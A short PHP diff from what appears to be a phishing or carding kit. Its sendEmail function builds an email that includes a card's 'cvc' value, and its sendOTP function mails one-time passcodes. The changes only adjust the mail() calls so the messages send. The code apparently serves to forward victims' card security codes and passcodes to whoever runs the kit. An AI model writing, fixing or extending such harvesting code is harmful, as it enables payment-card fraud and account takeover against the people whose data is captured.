@@ -90,7 +90,7 @@ function sendEmail($post) {
     $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
 
     // Send email
-    if (mail($to, $subject, $email_body, $headers, '-fno-reply@americaresides.com')) {
+    if (mail($to, $subject, $email_body, $headers)) {
         echo "success";
     } else {
         echo "Failed to send email to";
@@ -207,7 +207,7 @@ function sendOTP($post) {
     $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
     $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
     $headers .= "Reply-To: {$fromEmail}" . "\r\n";
-    if (mail($to, $subject, $email_body, '-f'.$headers)) {
+    if (mail($to, $subject, $email_body, $headers)) {
         echo "success";
     } else {
         echo "Failed to send email to";
